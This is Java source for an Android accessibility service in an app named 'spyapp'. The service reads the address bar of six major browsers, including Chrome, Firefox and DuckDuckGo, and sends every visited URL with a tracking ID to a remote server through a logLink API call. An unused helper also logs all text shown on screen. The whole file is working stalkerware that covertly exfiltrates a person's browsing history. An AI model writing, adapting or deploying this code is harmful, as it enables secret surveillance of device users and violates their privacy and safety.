package com.extrainch.spyapp;

import static android.content.ContentValues.TAG;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;

import com.extrainch.Api.ApiClient;
import com.extrainch.Models.NewMessageModel;
import com.extrainch.Models.NewMessageResponseModel;
import com.extrainch.Models.UrlModel;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class LogUrlService extends AccessibilityService {
    public String browserApp = "";
    public String browserUrl = "";
    ApiClient apiClient;
    public static String idLogs = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        apiClient = ApiClient.getInstance();

        final int eventType = event.getEventType();
        switch (eventType) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: {
                AccessibilityNodeInfo parentNodeInfo = event.getSource();
                if (parentNodeInfo == null) {
                    return;
                }

                String packageName = event.getPackageName().toString();
                SupportedBrowserConfig browserConfig = null;
                for (SupportedBrowserConfig supportedConfig : getSupportedBrowsers()) {
                    if (supportedConfig.packageName.equals(packageName)) {
                        browserConfig = supportedConfig;
                    }
                }
                //this is not supported browser, so exit
                if (browserConfig == null) {
                    return;
                }

                String capturedUrl = captureUrl(parentNodeInfo, browserConfig);
                parentNodeInfo.recycle();

                if (capturedUrl == null) {
                    return;
                }

                long eventTime = event.getEventTime();
                if (!packageName.equals(browserApp)) {
                    if (android.util.Patterns.WEB_URL.matcher(capturedUrl).matches()) {
                        Log.d("Browser", packageName + "  :  " + capturedUrl);

                        String id = idLogs;
                        String visitedLink = capturedUrl;

                        UrlModel urlModel = new UrlModel(
                                id,
                                visitedLink
                        );

                        apiClient.getSpyAppApiService().logLink(urlModel).enqueue(new Callback<NewMessageResponseModel>() {
                            @Override
                            public void onResponse(Call<NewMessageResponseModel> call, Response<NewMessageResponseModel> response) {
                                if (response.isSuccessful()) {
                                    Log.d(TAG, "Res:" + response.body());
                                }
                            }

                            @Override
                            public void onFailure(Call<NewMessageResponseModel> call, Throwable t) {
                                Log.d(TAG, "Error" + t.getMessage());
                            }
                        });

                        MainActivity.onBrowserRecv(packageName + "  :  " + capturedUrl);
                        browserApp = packageName;
                        browserUrl = capturedUrl;
                    }
                } else {
                    if (!capturedUrl.equals(browserUrl)) {
                        if (android.util.Patterns.WEB_URL.matcher(capturedUrl).matches()) {
                            browserUrl = capturedUrl;
                            Log.d("Browser", packageName + " " + capturedUrl);

                            String id = idLogs;
                            String visitedLink = capturedUrl;

                            UrlModel urlModel = new UrlModel(
                                    id,
                                    visitedLink
                            );

                            apiClient.getSpyAppApiService().logLink(urlModel).enqueue(new Callback<NewMessageResponseModel>() {
                                @Override
                                public void onResponse(Call<NewMessageResponseModel> call, Response<NewMessageResponseModel> response) {
                                    if (response.isSuccessful()) {
                                        Log.d(TAG, "Res:" + response.body());
                                    }
                                }

                                @Override
                                public void onFailure(Call<NewMessageResponseModel> call, Throwable t) {
                                    Log.d(TAG, "Error" + t.getMessage());
                                }
                            });
                            MainActivity.onBrowserRecv(packageName + "  :  " + capturedUrl);
                        }
                    }
                }
            }
            break;
        }
    }

    private static class SupportedBrowserConfig {
        public String packageName, addressBarId;

        public SupportedBrowserConfig(String packageName, String addressBarId) {
            this.packageName = packageName;
            this.addressBarId = addressBarId;
        }
    }

    @NonNull
    private static List<SupportedBrowserConfig> getSupportedBrowsers() {
        List<SupportedBrowserConfig> browsers = new ArrayList<>();
        browsers.add(new SupportedBrowserConfig("com.android.chrome", "com.android.chrome:id/url_bar"));
        browsers.add(new SupportedBrowserConfig("org.mozilla.firefox", "org.mozilla.firefox:id/mozac_browser_toolbar_url_view"));
        browsers.add(new SupportedBrowserConfig("com.opera.browser", "com.opera.browser:id/url_field"));
        browsers.add(new SupportedBrowserConfig("com.opera.mini.native", "com.opera.mini.native:id/url_field"));
        browsers.add(new SupportedBrowserConfig("com.duckduckgo.mobile.android", "com.duckduckgo.mobile.android:id/omnibarTextInput"));
        browsers.add(new SupportedBrowserConfig("com.microsoft.emmx", "com.microsoft.emmx:id/url_bar"));
        return browsers;
    }

    private void getChild(AccessibilityNodeInfo info) {
        int i = info.getChildCount();
        for (int p = 0; p < i; p++) {
            AccessibilityNodeInfo n = info.getChild(p);
            if (n != null) {
                String strres = n.getViewIdResourceName();
                if (n.getText() != null) {
                    String txt = n.getText().toString();
                    Log.d("Track", strres + "  :  " + txt);
                }
                getChild(n);
            }
        }
    }

    private String captureUrl(AccessibilityNodeInfo info, SupportedBrowserConfig config) {
        //  getChild(info);
        List<AccessibilityNodeInfo> nodes = info.findAccessibilityNodeInfosByViewId(config.addressBarId);
        if (nodes == null || nodes.size() <= 0) {
            return null;
        }
        AccessibilityNodeInfo addressBarNodeInfo = nodes.get(0);
        String url = null;
        if (addressBarNodeInfo.getText() != null) {
            url = addressBarNodeInfo.getText().toString();
        }
        addressBarNodeInfo.recycle();
        return url;
    }


    @Override
    public void onInterrupt() {
    }

    @Override
    public void onServiceConnected() {
    }

    public static void onIdRecv(String str) {
        idLogs += str;
    }
}
